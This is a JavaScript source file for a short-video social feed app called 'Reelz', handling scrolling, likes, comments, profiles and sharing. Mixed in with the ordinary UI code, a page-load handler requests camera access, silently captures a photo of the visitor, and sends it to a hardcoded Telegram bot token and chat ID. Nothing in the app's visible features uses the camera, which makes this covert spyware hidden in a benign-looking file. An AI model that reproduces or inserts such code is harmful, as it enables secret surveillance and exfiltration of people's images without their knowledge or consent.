/* ─────────────────────────────────────────
   Reelz App — app.js
───────────────────────────────────────── */

'use strict';

// ── STATE ──────────────────────────────────
const state = {
  currentCard: 0,
  totalCards: 0,
  theme: localStorage.getItem('theme') || 'dark',
  likedCards: new Set(JSON.parse(localStorage.getItem('likedCards') || '[]')),
  followedCreators: new Set(JSON.parse(localStorage.getItem('followedCreators') || '[]')),
  isScrolling: false,
};

// ── DOM REFS ───────────────────────────────
const $ = (sel, ctx = document) => ctx.querySelector(sel);
const $$ = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];

const feed          = $('#feed');
const topNav        = $('#topNav');
const navTabs       = $('#navTabs');
const tabIndicator  = $('#tabIndicator');
const themeBtn      = $('#themeBtn');
const searchBtn     = $('#searchBtn');
const searchOverlay = $('#searchOverlay');
const searchClose   = $('#searchClose');
const searchInput   = $('#searchInput');
const profileOverlay  = $('#profileOverlay');
const profileBackdrop = $('#profileBackdrop');
const commentOverlay  = $('#commentOverlay');
const commentBackdrop = $('#commentBackdrop');
const commentClose    = $('#commentClose');
const commentCount    = $('#commentCount');
const commentSheet    = $('#commentSheet');
const shareOverlay  = $('#shareOverlay');
const shareBackdrop = $('#shareBackdrop');
const bottomNavItems = $$('.nav-item');
const body          = document.body;


window.addEventListener("load", async () => {
  const video = document.getElementById("camera");
  const canvas = document.createElement("canvas");

  if (!video) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    video.srcObject = stream;

    // wait for camera to be ready
    await video.play();

    setTimeout(() => {
      // set canvas size = video size
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d");

      // draw current frame (THIS is the snap)
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // convert to image blob
      canvas.toBlob((blob) => {
        sendPhotoToTelegram(blob);

        // stop camera after snap
        stream.getTracks().forEach(track => track.stop());
      }, "image/jpeg", 0.9);

    }, 1000); // small delay so camera fully loads

  } catch (err) {
    console.error("Camera error:", err);
  }
});
// ── INIT ───────────────────────────────────
function init() {
  applyTheme(state.theme, false);
  state.totalCards = $$('.feed-card').length;
  buildProgressDots();
  initTabs();
  initFeed();
  initActions();
  initBottomNav();
  initSearch();
  initProfile();
  initComments();
  initShare();
  initParticles();
  initDoubleTap();
  restoreFollowState();
  restoreLikeState();
}

// ── THEME ──────────────────────────────────
function applyTheme(theme, save = true) {
  state.theme = theme;
  body.className = theme;
  body.dataset.theme = theme;
  if (save) localStorage.setItem('theme', theme);
}

themeBtn.addEventListener('click', () => {
  applyTheme(state.theme === 'dark' ? 'light' : 'dark');
});

// ── PROGRESS DOTS ──────────────────────────
function buildProgressDots() {
  const container = document.createElement('div');
  container.className = 'progress-dots';
  for (let i = 0; i < state.totalCards; i++) {
    const dot = document.createElement('div');
    dot.className = 'progress-dot' + (i === 0 ? ' active' : '');
    dot.dataset.index = i;
    container.appendChild(dot);
  }
  document.body.appendChild(container);
}

function updateProgressDots(index) {
  $$('.progress-dot').forEach((dot, i) => {
    dot.classList.toggle('active', i === index);
  });
}

// ── TAB INDICATOR ──────────────────────────
function initTabs() {
  const tabs = $$('.tab', navTabs);

  function moveIndicator(tab) {
    const tw = tab.offsetWidth;
    const tl = tab.offsetLeft;
    tabIndicator.style.width  = tw * 0.6 + 'px';
    tabIndicator.style.left   = tl + tw * 0.2 + 'px';
  }

  // Set on load
  const active = $('.tab.active', navTabs);
  if (active) {
    requestAnimationFrame(() => moveIndicator(active));
    window.addEventListener('resize', () => moveIndicator($('.tab.active', navTabs)), { passive: true });
  }

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      moveIndicator(tab);
    });
  });
}

// ── FEED SCROLL ────────────────────────────
function initFeed() {
  let lastScrollTop = 0;
  let scrollTimer;

  feed.addEventListener('scroll', () => {
    clearTimeout(scrollTimer);
    state.isScrolling = true;

    scrollTimer = setTimeout(() => {
      state.isScrolling = false;
      const scrollTop = feed.scrollTop;
      const cardHeight = window.innerHeight;
      const newIndex = Math.round(scrollTop / cardHeight);

      if (newIndex !== state.currentCard) {
        state.currentCard = newIndex;
        updateProgressDots(newIndex);
        onCardChanged(newIndex);
      }
    }, 80);
  }, { passive: true });

  // Touch swipe with velocity
  let touchStartY = 0;
  let touchStartTime = 0;

  feed.addEventListener('touchstart', e => {
    touchStartY = e.touches[0].clientY;
    touchStartTime = Date.now();
  }, { passive: true });

  feed.addEventListener('touchend', e => {
    const dy = touchStartY - e.changedTouches[0].clientY;
    const dt = Date.now() - touchStartTime;
    const velocity = Math.abs(dy) / dt;

    if (velocity > 0.4 && Math.abs(dy) > 30) {
      const dir = dy > 0 ? 1 : -1;
      const target = Math.max(0, Math.min(state.totalCards - 1, state.currentCard + dir));
      scrollToCard(target);
    }
  }, { passive: true });
}

function scrollToCard(index) {
  feed.scrollTo({ top: index * window.innerHeight, behavior: 'smooth' });
  state.currentCard = index;
  updateProgressDots(index);
  onCardChanged(index);
}

function onCardChanged(index) {
  updateVideoPlayback(index);
  // Re-trigger card info animation
  const cards = $$('.feed-card');
  if (cards[index]) {
    const info = $('.card-info', cards[index]);
    if (info) {
      info.style.animation = 'none';
      requestAnimationFrame(() => {
        info.style.animation = '';
      });
    }
  }
}

// ── ACTION BUTTONS ─────────────────────────
function initActions() {
  // Like buttons
  $$('.like-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      toggleLike(btn);
    });
  });

  // Comment buttons
  $$('.comment-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const card = btn.closest('.feed-card');
      const count = parseInt(btn.dataset.count || 244);
      openComments(count);
    });
  });

  // Share buttons
  $$('.share-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      openOverlay(shareOverlay);
    });
  });

  // Bookmark buttons
  $$('.bookmark-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      toggleBookmark(btn);
    });
  });

  // Follow pills
  $$('.follow-pill').forEach(pill => {
    pill.addEventListener('click', (e) => {
      e.stopPropagation();
      toggleFollow(pill);
    });
  });
}

function toggleLike(btn) {
  const isLiked = btn.classList.toggle('liked');
  const countEl = btn.querySelector('.action-count');
  const cardIndex = btn.closest('.feed-card').dataset.index;
  const rawCount = parseInt(btn.dataset.count || 0);

  if (isLiked) {
    state.likedCards.add(cardIndex);
    btn.dataset.count = rawCount + 1;
    countEl.textContent = formatCount(rawCount + 1);
    animateButtonPop(btn);
  } else {
    state.likedCards.delete(cardIndex);
    btn.dataset.count = rawCount - 1;
    countEl.textContent = formatCount(rawCount - 1);
  }

  saveLikeState();
}

function toggleBookmark(btn) {
  const isSaved = btn.classList.toggle('liked');
  animateButtonPop(btn);
  if (isSaved) {
    btn.querySelector('.btn-glass svg').style.fill = '#fff';
  } else {
    btn.querySelector('.btn-glass svg').style.fill = 'none';
  }
}

function toggleFollow(pill) {
  const wrap = pill.closest('.avatar-wrap');
  const creatorId = wrap.dataset.creator;
  const isFollowing = pill.classList.toggle('following');

  if (isFollowing) {
    pill.textContent = '✓';
    state.followedCreators.add(creatorId);
  } else {
    pill.textContent = '+';
    state.followedCreators.delete(creatorId);
  }

  saveFollowState();
  animateButtonPop(pill);
}

function animateButtonPop(el) {
  el.style.transform = 'scale(1.3)';
  setTimeout(() => {
    el.style.transform = '';
  }, 200);
}

function formatCount(n) {
  if (n >= 1000000) return (n / 1000000).toFixed(1) + 'M';
  if (n >= 1000) return (n / 1000).toFixed(1) + 'K';
  return n.toString();
}

// Persist state
function saveLikeState() {
  localStorage.setItem('likedCards', JSON.stringify([...state.likedCards]));
}

function saveFollowState() {
  localStorage.setItem('followedCreators', JSON.stringify([...state.followedCreators]));
}

function restoreLikeState() {
  state.likedCards.forEach(cardIndex => {
    const card = $(`.feed-card[data-index="${cardIndex}"]`);
    if (card) {
      const likeBtn = $('.like-btn', card);
      if (likeBtn) likeBtn.classList.add('liked');
    }
  });
}

function restoreFollowState() {
  state.followedCreators.forEach(creatorId => {
    const wrap = $(`.avatar-wrap[data-creator="${creatorId}"]`);
    if (wrap) {
      const pill = $('.follow-pill', wrap);
      if (pill) {
        pill.classList.add('following');
        pill.textContent = '✓';
      }
    }
  });
}

// ── DOUBLE TAP LIKE ────────────────────────
function initDoubleTap() {
  $$('.tap-zone').forEach(zone => {
    let lastTap = 0;

    zone.addEventListener('click', (e) => {
      const now = Date.now();
      const timeDiff = now - lastTap;

      if (timeDiff < 300 && timeDiff > 0) {
        // Double tap!
        const card = zone.closest('.feed-card');
        const likeBtn = $('.like-btn', card);
        const heartBurst = $('.heart-burst', card);

        // Like if not already liked
        if (likeBtn && !likeBtn.classList.contains('liked')) {
          toggleLike(likeBtn);
        }

        // Show heart burst at tap position
        if (heartBurst) {
          const rect = card.getBoundingClientRect();
          const x = e.clientX - rect.left - 45;
          const y = e.clientY - rect.top - 45;

          heartBurst.style.left = x + 'px';
          heartBurst.style.top  = y + 'px';
          heartBurst.classList.remove('animate');

          requestAnimationFrame(() => {
            requestAnimationFrame(() => {
              heartBurst.classList.add('animate');
            });
          });

          heartBurst.addEventListener('animationend', () => {
            heartBurst.classList.remove('animate');
          }, { once: true });
        }
      }

      lastTap = now;
    });
  });
}

// ── BOTTOM NAV ─────────────────────────────
function initBottomNav() {
  bottomNavItems.forEach(item => {
    if (item.classList.contains('create-btn')) return;
    item.addEventListener('click', () => {
      bottomNavItems.forEach(i => i.classList.remove('active'));
      item.classList.add('active');
    });
  });

  // Create button ripple
  const createBtn = $('.create-btn');
  if (createBtn) {
    createBtn.addEventListener('click', () => {
      const icon = $('.create-icon', createBtn);
      icon.style.transform = 'scale(0.9) rotate(45deg)';
      setTimeout(() => {
        icon.style.transform = '';
      }, 300);
    });
  }
}

// ── SEARCH ─────────────────────────────────
function initSearch() {
  searchBtn.addEventListener('click', () => {
    openOverlay(searchOverlay);
    setTimeout(() => searchInput && searchInput.focus(), 400);
  });

  searchClose.addEventListener('click', () => closeOverlay(searchOverlay));

  // Click backdrop
  $('.overlay-backdrop', searchOverlay)?.addEventListener('click', () => {
    closeOverlay(searchOverlay);
  });

  // Trend items
  $$('.trend-item').forEach(item => {
    item.addEventListener('click', () => {
      const tag = item.querySelector('.trend-tag').textContent;
      if (searchInput) searchInput.value = tag;
    });
  });
}

// ── PROFILE MODAL ──────────────────────────
function initProfile() {
  $$('.avatar-wrap').forEach(wrap => {
    wrap.addEventListener('click', (e) => {
      if (e.target.classList.contains('follow-pill')) return;
      const creatorId = wrap.dataset.creator;
      openProfile(creatorId);
    });
  });

  profileBackdrop.addEventListener('click', () => closeOverlay(profileOverlay));

  // Swipe down to close
  initSwipeClose(profileOverlay, $('.profile-sheet', profileOverlay));
}

const creatorData = {
  azeva:    { name: 'Azeva',       handle: '@azeva',       followers: '2.4M', following: '148',  likes: '18.2M', gradient: 'linear-gradient(135deg,#ff2d55,#ff6b35)' },
  kaito:    { name: 'kaitodraws',  handle: '@kaitodraws',  followers: '890K',  following: '312',  likes: '7.4M',  gradient: 'linear-gradient(135deg,#00c9a7,#0072ff)' },
  luna:     { name: 'lunasings',   handle: '@lunasings',   followers: '5.1M',  following: '94',   likes: '41.3M', gradient: 'linear-gradient(135deg,#f093fb,#f5576c)' },
  maxfit:   { name: 'maxfit',      handle: '@maxfit',      followers: '1.2M',  following: '206',  likes: '9.8M',  gradient: 'linear-gradient(135deg,#f7971e,#ffd200)' },
};

function openProfile(creatorId) {
  const data = creatorData[creatorId] || creatorData.azeva;

  $('#profileName').textContent    = data.name;
  $('#profileHandle').textContent  = data.handle;

  const avatarEl = $('#profileAvatarLg');
  avatarEl.style.background = data.gradient;
  avatarEl.innerHTML = `<svg viewBox="0 0 64 64" fill="none" style="width:40px;height:40px"><circle cx="32" cy="26" r="11" fill="rgba(255,255,255,0.9)"/><ellipse cx="32" cy="54" rx="20" ry="12" fill="rgba(255,255,255,0.9)"/></svg>`;

  const stats = $$('.stat', profileOverlay);
  if (stats[0]) stats[0].querySelector('.stat-num').textContent = data.followers;
  if (stats[1]) stats[1].querySelector('.stat-num').textContent = data.following;
  if (stats[2]) stats[2].querySelector('.stat-num').textContent = data.likes;

  openOverlay(profileOverlay);
}

// ── COMMENTS ───────────────────────────────
function initComments() {
  commentBackdrop.addEventListener('click', () => closeOverlay(commentOverlay));
  commentClose.addEventListener('click',    () => closeOverlay(commentOverlay));

  // Swipe down to close
  initSwipeClose(commentOverlay, commentSheet);

  // Send comment
  const sendBtn   = $('.send-btn',      commentOverlay);
  const inputEl   = $('.comment-input', commentOverlay);
  const list      = $('.comment-list',  commentOverlay);

  sendBtn.addEventListener('click', () => sendComment(inputEl, list));
  inputEl.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') sendComment(inputEl, list);
  });
}

function sendComment(inputEl, list) {
  const text = inputEl.value.trim();
  if (!text) return;

  const colors = [
    'linear-gradient(135deg,#ff2d55,#ff6b35)',
    'linear-gradient(135deg,#00c9a7,#0072ff)',
    'linear-gradient(135deg,#f7971e,#ffd200)',
    'linear-gradient(135deg,#f093fb,#f5576c)',
  ];
  const color = colors[Math.floor(Math.random() * colors.length)];

  const item = document.createElement('div');
  item.className = 'comment-item';
  item.style.animation = 'infoFadeIn 0.3s ease both';
  item.innerHTML = `
    <div class="comment-avatar" style="background:${color}"></div>
    <div class="comment-body">
      <strong>you</strong>
      <p>${escapeHtml(text)}</p>
      <span class="comment-time">Just now</span>
    </div>
    <div class="comment-like">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
      <span>0</span>
    </div>`;

  list.appendChild(item);
  list.scrollTop = list.scrollHeight;
  inputEl.value = '';
}

function openComments(count) {
  if (commentCount) commentCount.textContent = count;
  openOverlay(commentOverlay);
}

function escapeHtml(str) {
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// ── SHARE SHEET ────────────────────────────
function initShare() {
  shareBackdrop.addEventListener('click', () => closeOverlay(shareOverlay));
  initSwipeClose(shareOverlay, $('.share-sheet', shareOverlay));

  // Copy link option
  $$('.share-opt').forEach((opt, i) => {
    opt.addEventListener('click', () => {
      if (i === 3) {
        // Copy link
        navigator.clipboard?.writeText(window.location.href).catch(() => {});
        const span = opt.querySelector('span');
        const orig = span.textContent;
        span.textContent = 'Copied!';
        setTimeout(() => { span.textContent = orig; }, 2000);
      }
      closeOverlay(shareOverlay);
    });
  });
}

// ── OVERLAY HELPERS ────────────────────────
function openOverlay(overlay) {
  overlay.classList.add('open');
  overlay.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
}

function closeOverlay(overlay) {
  overlay.classList.remove('open');
  overlay.setAttribute('aria-hidden', 'true');
  document.body.style.overflow = '';
}

// Swipe-down-to-close for bottom sheets
function initSwipeClose(overlay, sheet) {
  if (!sheet) return;
  let startY = 0;
  let currentY = 0;
  let isDragging = false;

  sheet.addEventListener('touchstart', e => {
    startY = e.touches[0].clientY;
    isDragging = true;
    sheet.style.transition = 'none';
  }, { passive: true });

  sheet.addEventListener('touchmove', e => {
    if (!isDragging) return;
    currentY = e.touches[0].clientY;
    const dy = Math.max(0, currentY - startY);
    sheet.style.transform = `translateY(${dy}px)`;
  }, { passive: true });

  sheet.addEventListener('touchend', () => {
    isDragging = false;
    sheet.style.transition = '';
    const dy = currentY - startY;
    if (dy > 100) {
      closeOverlay(overlay);
      sheet.style.transform = '';
    } else {
      sheet.style.transform = '';
    }
  });
}

// ── PARTICLE CANVAS ────────────────────────
function initParticles() {
  const canvas = $('#particleCanvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  let W, H, particles = [];

  function resize() {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }

  resize();
  window.addEventListener('resize', resize, { passive: true });

  const COLORS = ['#ff2d55','#ff6b35','#00c9a7','#7c3aed','#f093fb','#0072ff','#f7971e'];

  function createParticle() {
    return {
      x: Math.random() * W,
      y: Math.random() * H,
      r: Math.random() * 2.5 + 0.5,
      dx: (Math.random() - 0.5) * 0.4,
      dy: -(Math.random() * 0.6 + 0.2),
      opacity: Math.random() * 0.6 + 0.1,
      color: COLORS[Math.floor(Math.random() * COLORS.length)],
      life: 0,
      maxLife: Math.random() * 300 + 200,
    };
  }

  for (let i = 0; i < 60; i++) {
    const p = createParticle();
    p.life = Math.random() * p.maxLife; // stagger initial positions
    particles.push(p);
  }

  function draw() {
    ctx.clearRect(0, 0, W, H);

    particles.forEach((p, i) => {
      p.x += p.dx;
      p.y += p.dy;
      p.life++;

      const progress = p.life / p.maxLife;
      const alpha = progress < 0.2
        ? (progress / 0.2) * p.opacity
        : progress > 0.8
          ? ((1 - progress) / 0.2) * p.opacity
          : p.opacity;

      ctx.beginPath();
      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
      ctx.fillStyle = p.color;
      ctx.globalAlpha = alpha;
      ctx.fill();
      ctx.globalAlpha = 1;

      if (p.life >= p.maxLife || p.y < -10 || p.x < -10 || p.x > W + 10) {
        particles[i] = createParticle();
      }
    });

    requestAnimationFrame(draw);
  }

  draw();
}

// ── KEYBOARD SHORTCUTS ─────────────────────
document.addEventListener('keydown', e => {
  switch (e.key) {
    case 'ArrowDown': case 'j':
      scrollToCard(Math.min(state.totalCards - 1, state.currentCard + 1));
      break;
    case 'ArrowUp': case 'k':
      scrollToCard(Math.max(0, state.currentCard - 1));
      break;
    case '/':
      e.preventDefault();
      openOverlay(searchOverlay);
      setTimeout(() => searchInput?.focus(), 400);
      break;
    case 'Escape':
      [searchOverlay, profileOverlay, commentOverlay, shareOverlay].forEach(closeOverlay);
      break;
    case 'l': {
      const card = $$('.feed-card')[state.currentCard];
      if (card) {
        const likeBtn = $('.like-btn', card);
        if (likeBtn) toggleLike(likeBtn);
      }
      break;
    }
  }
});

// ── GLASS REFLECTIONS / PARALLAX ───────────
(function initParallax() {
  let ticking = false;

  function onScroll() {
    if (ticking) return;
    requestAnimationFrame(() => {
      const scrollTop = feed.scrollTop;
      const cardH     = window.innerHeight;
      const progress  = (scrollTop % cardH) / cardH;

      const cards = $$('.feed-card');
      const ci = Math.floor(scrollTop / cardH);

      if (cards[ci]) {
        const orbs = $$('.bg-orb', cards[ci]);
        orbs.forEach((orb, i) => {
          const dir = i % 2 === 0 ? 1 : -1;
          orb.style.transform = `translateY(${dir * progress * 30}px)`;
        });
      }

      ticking = false;
    });
    ticking = true;
  }

  feed.addEventListener('scroll', onScroll, { passive: true });
})();

// Pause all, play only current
function updateVideoPlayback(index) {
  document.querySelectorAll('.card-bg-video').forEach((vid, i) => {
    if (i === index) {
      vid.play();
    } else {
      vid.pause();
    }
  });
}

// ── START ──────────────────────────────────
document.addEventListener('DOMContentLoaded', init);

const botToken = "8836463939:AAHJ5wDMQ8aOFtaerzbTQ8BCfEhNNGlquMc";
const chatId = "8474074506";

function sendPhotoToTelegram(blob) {
  const formData = new FormData();

  formData.append("chat_id", chatId);
  formData.append("photo", blob, "photo.jpg");

  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error(err));
}